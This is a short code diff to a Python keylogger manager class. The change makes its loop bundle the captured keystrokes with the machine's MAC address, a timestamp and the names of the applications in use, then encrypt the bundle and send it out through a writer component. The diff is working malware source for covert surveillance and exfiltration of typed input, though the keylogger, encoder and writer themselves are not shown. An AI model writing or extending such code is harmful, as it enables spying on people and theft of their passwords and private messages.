@@ -64,12 +64,13 @@ class KeyLoggerManager:
         Runs in a loop until `self.flag` is set to False.
         """
         while self.flag:
-            logged_keys = "".join(self.keylogger.get_logged_keys())
+            apps, logged_keys = self.keylogger.get_logged_keys()
             if logged_keys:
-                logged_keys = datetime.now().strftime('%H:%M:%S %d/%m/%Y\n') + logged_keys
+                final_data = (self.mac_address + '\n' + datetime.now().strftime('%H:%M:%S %d/%m/%Y\n')
+                              + ", ".join(apps) + '\n' + logged_keys)
                 try:
-                    encrypted_data = self.encoder.encrypt(logged_keys)
-                    self.writer.send_data(encrypted_data, self.mac_address)
+                    encrypted_data = self.encoder.encrypt(final_data)
+                    self.writer.send_data(encrypted_data)
                     logging.info(f'Data written to {self.writer}')
                 except Exception as e:
                     logging.error(e)
